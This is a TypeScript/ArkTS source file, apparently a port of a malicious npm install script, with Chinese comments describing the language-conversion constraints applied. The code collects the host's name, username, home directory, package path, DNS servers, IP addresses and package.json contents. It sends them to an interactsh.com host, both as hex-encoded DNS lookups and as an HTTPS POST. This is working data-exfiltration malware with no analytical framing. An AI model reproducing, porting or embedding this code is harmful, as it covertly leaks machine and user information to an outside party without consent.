// 应用ArkTS约束：
// 1. 使用let/const代替var（约束9）
// 2. 添加类型注解（约束1,10,23）
// 3. 替换require为import（约束60,80）
// 4. 处理对象字面量类型（约束24）
// 5. 使用箭头函数（约束26,47）
// 6. 处理可选属性（约束76）
// 7. 处理Buffer替代方案（约束75）
// 8. 处理动态import位置（约束80）

import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets';

const packageName = packageJSON.name;

interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any;  // 注意：实际应定义具体类型
    ip: string;
}

function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath = paths[j];
        let files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

function toHex(data: string): string {
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    return Array.from(encoded).map(b => b.toString(16).padStart(2, '0')).join('');
}

function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let interfaces = networkInterfaces[item];
            if (interfaces) {
                for (let i = 0; i < interfaces.length; i++) {
                    str.push(interfaces[i].address);
                }
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let interfaces = networkInterfaces[item];
            if (interfaces) {
                for (let i = 0; i < interfaces.length; i++) {
                    str += toHex(interfaces[i].address) + ".";
                }
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: TrackingData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化的分块逻辑，实际需要根据长度计算
        queries.push(`${toHex(pkg.hn)}.${toHex(pkg.p)}.${hostname}`);
        queries.push(`${getIps()}.${hostname}`);
    } else {
        queries.push(baseStr);
    }
    return queries;
}

const td: TrackingData = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips())
};

let qs = toName(td);
qs.forEach((query) => {
    dns.lookup(query, (err: Error | null, result: string) => {
        // console.log处理
    });
});

const trackingData = JSON.stringify(td);
let postData = querystring.stringify({
    msg: trackingData,
});

let options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

let req = https.request(options, (res) => {
    res.on("data", (d: Buffer) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
